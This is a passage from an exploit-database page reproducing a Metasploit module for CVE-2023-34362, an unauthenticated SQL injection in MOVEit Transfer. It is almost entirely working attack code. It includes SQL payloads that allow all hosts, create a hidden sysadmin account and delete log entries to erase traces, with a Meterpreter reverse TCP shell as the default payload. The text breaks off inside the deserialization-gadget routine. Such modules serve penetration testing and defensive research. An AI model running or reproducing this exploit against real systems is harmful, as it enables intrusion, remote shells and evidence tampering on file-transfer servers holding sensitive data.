---
title: MOVEit SQL Injection Exploit exploit
url: https://sploitus.com/exploit?id=1337DAY-ID-38820&utm_source=rss&utm_medium=rss
source: Sploitus.com Exploits RSS Feed
date: 2023-06-27
fetch_date: 2025-10-04T11:45:17.065893
---

# MOVEit SQL Injection Exploit exploit

[x]
Dark Mode

[##### SPLOITUS](/)

# MOVEit SQL Injection Exploit CVE-2023-34362

2023-06-26 | CVSS 9.8

Copy
Download
Source
[Share](#share-url)

```
## https://sploitus.com/exploit?id=1337DAY-ID-38820
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MOVEit SQL Injection vulnerability',
        'Description' => %q{
          This module exploits an SQL injection vulnerability in the MOVEit Transfer web application
          that allows an unauthenticated attacker to gain access to MOVEit Transferâ€™s database.
          Depending on the database engine being used (MySQL, Microsoft SQL Server, or Azure SQL), an
          attacker can leverage an information leak be able to upload a .NET deserialization payload.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7', # PoC https://github.com/sfewer-r7/CVE-2023-34362
          'rbowes-r7', # research
          'bwatters-r7' # module
        ],
        'References' => [
          ['CVE', '2023-34362' ],
          ['URL', 'https://github.com/sfewer-r7/CVE-2023-34362'],
          ['URL', 'https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis'],
          ['URL', 'https://www.wiz.io/blog/cve-2023-34362']
        ],
        'Platform' => 'win',
        'Arch' => [ARCH_CMD],
        'Payload' => {
          'Space' => 345
        },
        'Targets' => [
          [
            'Windows Command',
            {
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/http/x64/meterpreter/reverse_tcp',
                'RPORT' => 443,
                'SSL' => true
              }
            }
          ],
        ],
        'DisclosureDate' => '2023-05-31',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]
        }
      )
    )
    register_options(
      [
        Msf::OptString.new('TARGET_URI', [ false, 'Target URI', '/api/v1/token']),
        Msf::OptString.new('USERNAME', [ true, 'Username', Rex::Text.rand_text_alphanumeric(5..11)]),
        Msf::OptString.new('LOGIN_NAME', [ true, 'Login Name', Rex::Text.rand_text_alphanumeric(5..11)]),
        Msf::OptString.new('PASSWORD', [ true, 'Password', Rex::Text.rand_text_alphanumeric(5..11)])
      ]
    )
    @moveit_token = nil
    @moveit_instid = nil
    @guest_email_addr = "#{Rex::Text.rand_text_alphanumeric(5..12)}@#{Rex::Text.rand_text_alphanumeric(3..6)}.com"
    @uploadfile_name = Rex::Text.rand_text_alphanumeric(8..15)
    @uploadfile_size = rand(5..64)
    @uploadfile_data = Rex::Text.rand_text_alphanumeric(@uploadfile_size)
    @user_added = false
    @files_json = nil
  end

  def begin_file_upload(folders_json, token_json)
    boundary = rand_text_numeric(27)
    post_data = "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"name\"\r\n\r\n#{@uploadfile_name}\r\n--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"size\"\r\n\r\n#{@uploadfile_size}\r\n--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"comments\"\r\n\r\n\r\n--#{boundary}--\r\n"
    res = send_request_raw({
      'method' => 'POST',
      'uri' => normalize_uri("/api/v1/folders/#{folders_json['items'][0]['id']}/files?uploadType=resumable"),
      'headers' => {
        'Content-Type' => 'multipart/form-data; boundary=' + boundary,
        'Authorization' => "Bearer #{token_json['access_token']}"
      },
      'connection' => 'close',
      'accept' => '*/*',
      'data' => post_data.to_s
    })

    fail_with(Msf::Exploit::Failure::Unknown, "Couldn't post API files #1 (#{files_response.body})") if res.nil? || res.code != 200

    files_json = res.get_json_document
    vprint_status("Initiated resumable file upload for fileId '#{files_json['fileId']}'...")
    files_json
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('moveitisapi/moveitisapi.dll?action=capa'),
      'connection' => 'close',
      'accept' => '*/*'
    })
    version = nil
    if res && res.code == 200 && res.headers.key?('X-MOVEitISAPI-Version')
      version = Rex::Version.new(res.headers['X-MOVEitISAPI-Version'])
      # 2020.1.x AKA 12.1.x
      return Exploit::CheckCode::Appears if version >= Rex::Version.new('12.1.0') && version < Rex::Version.new('12.1.10')
      # 2021.0.x AKA 13.0.x
      return Exploit::CheckCode::Appears if version >= Rex::Version.new('13.0.0') && version < Rex::Version.new('13.0.8')
      # 2021.1.x AKA 13.1.x
      return Exploit::CheckCode::Appears if version >= Rex::Version.new('13.1.0') && version < Rex::Version.new('13.1.6')
      # 2022.0.x AKA 14.0.x
      return Exploit::CheckCode::Appears if version >= Rex::Version.new('14.0.0') && version < Rex::Version.new('14.0.6')
      # 2022.1.x AKA 14.1.x
      return Exploit::CheckCode::Appears if version >= Rex::Version.new('14.1.0') && version < Rex::Version.new('14.1.7')
      # 2023.0.x AKA 15.0.x
      return Exploit::CheckCode::Appears if version >= Rex::Version.new('15.0.0') && version < Rex::Version.new('15.0.3')
    else
      return Exploit::CheckCode::Safe
    end
    return Exploit::CheckCode::Unknown
  end

  def cleanup
    cleanup_user(@files_json) if @user_added
    super
  end

  def cleanup_user(files_json)
    hax_username = datastore['USERNAME']
    hax_loginname = datastore['LOGIN_NAME']
    deleteuser_payload = [
      "DELETE FROM moveittransfer.fileuploadinfo WHERE FileID='#{files_json['fileId']}'", # delete the deserialization payload
      "DELETE FROM moveittransfer.files WHERE UploadUsername='#{hax_username}'", # delete the file we uploaded
      "DELETE FROM moveittransfer.activesessions WHERE Username='#{hax_username}'", #
      "DELETE FROM moveittransfer.users WHERE Username='#{hax_username}'", # delete the user account we created
      "DELETE FROM moveittransfer.log WHERE Username='#{hax_username}'", # The web ASP stuff logs by username
      "DELETE FROM moveittransfer.log WHERE Username='#{hax_loginname}'", # The API logs by loginname
      "DELETE FROM moveittransfer.log WHERE Username='Guest:#{@guest_email_addr}'", # The SQLi generates a guest log entry.
    ]
    if @user_added
      vprint_status("Deleting user #{hax_username}")
      sqli(sqli_payload(deleteuser_payload))
      @user_added = false
    end
  end

  def create_sysadmin
    hax_username = datastore['USERNAME']
    hax_password = datastore['PASSWORD']
    hax_loginname = datastore['LOGIN_NAME']
    createuser_payload = [
      "UPDATE moveittransfer.hostpermits SET Host='*.*.*.*' WHERE Host!='*.*.*.*'",
      "INSERT INTO moveittransfer.users (Username) VALUES ('#{hax_username}')",
      "UPDATE moveittransfer.users SET LoginName='#{hax_loginname}' WHERE Username='#{hax_username}'",
      "UPDATE moveittransfer.users SET InstID='#{@moveit_instid}' WHERE Username='#{hax_username}'",
      "UPDATE moveittransfer.users SET Password='#{makev1password(hax_password, Rex::Text.rand_text_alphanumeric(4))}' WHERE Username='#{hax_username}'",
      "UPDATE moveittransfer.users SET Permission='40' WHERE Username='#{hax_username}'",
      "UPDATE moveittransfer.users SET CreateStamp=NOW() WHERE Username='#{hax_username}'",
    ]
    res = sqli(sqli_payload(createuser_payload))

    fail_with(Msf::Exploit::Failure::Unknown, "Couldn't perform initial SQLi (#{res.body})") if res.code != 200
    @user_added = true
  end

  def encrypt_deserialization_gadget(gadget, org_key)
    org_key = org_key.gsub(' ', '')
    org_key = [org_key].pack('H*').bytes.pack('C*')
    ...